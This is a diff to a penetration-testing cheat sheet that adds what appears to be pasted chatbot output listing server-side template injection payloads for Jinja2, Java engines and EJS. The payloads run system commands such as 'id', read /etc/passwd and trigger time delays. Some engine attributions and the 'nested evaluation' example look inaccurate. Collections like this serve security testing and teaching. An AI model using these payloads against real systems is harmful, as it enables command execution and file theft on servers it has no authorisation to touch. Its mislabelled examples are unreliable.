@@ -2987,6 +2987,161 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 {{dump(app)}}
 {{app.request.server.all|join(',')}}
 ```
+Absolutely, Anvesh! Here's a **complete SSTI test case list with payloads**, aligned with your GitHub methodology and PortSwigger’s lab structure. It’s formatted for clarity and ready to drop into your cheat sheets or automation workflows.
+
+---
+
+## 🧪 Server-Side Template Injection (SSTI) — Test Cases with Payloads
+
+---
+
+### **1. Basic Expression Evaluation**
+Detects template parsing by evaluating math or string operations.
+
+```text
+{{7*7}}         → 49 (Jinja2, Twig)
+${7*7}          → 49 (Velocity)
+<%= 7*7 %>      → 49 (EJS)
+#{7*7}          → 49 (Pug)
+```
+
+---
+
+### **2. Error-Based Detection**
+Triggers template engine errors to identify backend tech.
+
+```text
+{{7/0}}         → Division error (Jinja2)
+${7/0}          → Velocity error
+<%= 7/0 %>      → EJS error
+```
+
+---
+
+### **3. Template Engine Identification**
+Use engine-specific syntax to fingerprint the backend.
+
+```text
+{{"a"*5}}       → aaaaa (Jinja2)
+${"a".repeat(5)} → aaaaa (Velocity)
+<%= "a".repeat(5) %> → aaaaa (EJS)
+```
+
+---
+
+### **4. Code Execution via SSTI**
+Execute system commands if template engine allows.
+
+```text
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}  # Jinja2
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}                    # Java (Freemarker)
+<%= require('child_process').execSync('id') %>                                           # Node.js (EJS)
+```
+
+---
+
+### **5. File Read via SSTI**
+Access sensitive files using template logic.
+
+```text
+{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}  # Jinja2
+${new java.io.FileReader('/etc/passwd')}                      # Java
+<%= fs.readFileSync('/etc/passwd') %>                         # Node.js
+```
+
+---
+
+### **6. Blind SSTI via Time Delay**
+Use time-based payloads to infer execution.
+
+```text
+{{ cycler.__init__.__globals__.os.system('sleep 5') }}        # Jinja2
+${T(java.lang.Thread).sleep(5000)}                            # Java
+<%= require('child_process').execSync('sleep 5') %>           # Node.js
+```
+
+---
+
+### **7. SSTI via POST Body**
+Inject payloads into form fields or JSON.
+
+```http
+POST /submit HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name={{7*7}}
+```
+
+---
+
+### **8. SSTI via Headers**
+Inject into `User-Agent`, `Referer`, or custom headers.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable.com
+User-Agent: {{7*7}}
+```
+
+---
+
+### **9. SSTI via Cookies**
+Target server-side parsing of cookie values.
+
+```http
+GET / HTTP/1.1
+Host: vulnerable.com
+Cookie: session={{7*7}}
+```
+
+---
+
+### **10. SSTI via URL Path or Query**
+Inject directly into path or query parameters.
+
+```http
+GET /hello/{{7*7}} HTTP/1.1
+Host: vulnerable.com
+```
+
+---
+
+### **11. SSTI via Template Injection in Logic**
+Manipulate template logic or control flow.
+
+```text
+{{ config.items() }}  # Jinja2
+${applicationScope}   # JSP
+<%= locals %>         # EJS
+```
+
+---
+
+### **12. SSTI via Nested Evaluation**
+Use double evaluation to bypass filters.
+
+```text
+{{ '{{7*7}}' }} → {{7*7}} → 49
+```
+
+---
+
+### **13. SSTI via Unescaped Output**
+Inject into unescaped template blocks.
+
+```text
+{{ unsafe_variable }}  # If not escaped
+```
+
+---
+
+### **14. SSTI via Template Injection in Email/Message**
+Inject into dynamic templates used in emails or notifications.
+
+```text
+Dear {{user.name}}, your balance is {{user.balance}}.
+→ Inject: {{7*7}} → 49
+```
 
 ---
 # JSON Web Token (JWT) Exploitation & SQL Injection Techniques
